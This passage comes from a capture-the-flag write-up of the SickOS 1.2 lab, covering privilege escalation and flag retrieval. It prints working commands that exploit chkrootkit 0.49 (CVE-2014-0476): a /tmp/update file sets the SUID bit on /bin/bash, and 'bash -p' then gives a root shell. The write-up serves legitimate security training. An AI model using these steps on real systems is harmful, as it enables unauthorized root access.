10. Privilege Escalation

The installed chkrootkit version was identified as:

chkrootkit 0.49

This version is associated with CVE-2014-0476, a local privilege-escalation vulnerability involving the execution of a malicious /tmp/update file when chkrootkit runs with elevated privileges.

Because the scheduled chkrootkit task executes with root privileges, this created a path from the compromised www-data account to root.

For the controlled lab environment, I created the required /tmp/update file and made it executable.

www-data@ubuntu:/tmp$ echo 'chmod +s /bin/bash' > /tmp/update

www-data@ubuntu:/tmp$ chmod +x /tmp/update

After the scheduled task executed, /bin/bash acquired the SUID permission:

www-data@ubuntu:/tmp$ ls -la /bin/bash

-rwsr-sr-x 1 root root 1014K Apr 12  2012 /bin/bash

The SUID bit was successfully set.

I then executed Bash in privileged mode:

www-data@ubuntu:/tmp$ /bin/bash -p

bash-4.2# whoami
root

Privilege escalation was successful.

11. Root Access and Flag Retrieval

The final privilege level was:

root

I navigated to the root user's home directory:

root@ubuntu:/tmp# cd /root
root@ubuntu:~# ls -al

The challenge flag was located in:

/root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt

Reading the file confirmed successful completion of the SickOS 1.2 challenge.

